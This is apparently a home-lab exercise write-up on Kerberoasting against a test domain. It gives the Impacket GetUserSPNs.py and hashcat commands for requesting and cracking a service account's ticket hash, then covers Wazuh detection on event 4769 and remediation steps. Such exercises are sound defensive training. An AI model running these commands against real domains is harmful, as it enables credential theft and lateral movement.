# Attack Exercise — Kerberoasting

**MITRE ATT&CK:** T1558.003  
**Tool:** Impacket GetUserSPNs.py  
**Target:** svc-sql service account (SPN set)

## Attack
```bash
# From Kali (10.10.10.5)
python3 GetUserSPNs.py lab.local/jsmith:Password123! \
  -dc-ip 10.10.10.10 \
  -request \
  -outputfile hashes.txt

# Crack offline
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
```

## Detection (Wazuh)
- Event ID 4769 on dc01 — TGS ticket requested for svc-sql with encryption type 0x17 (RC4)
- Wazuh rule 100001 fires at level 12

## Evidence
Add screenshot of Wazuh alert here

## Remediation
- Rotate svc-sql password to 25+ char random
- Add svc-sql to Protected Users group
- Audit all SPNs: `Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName`
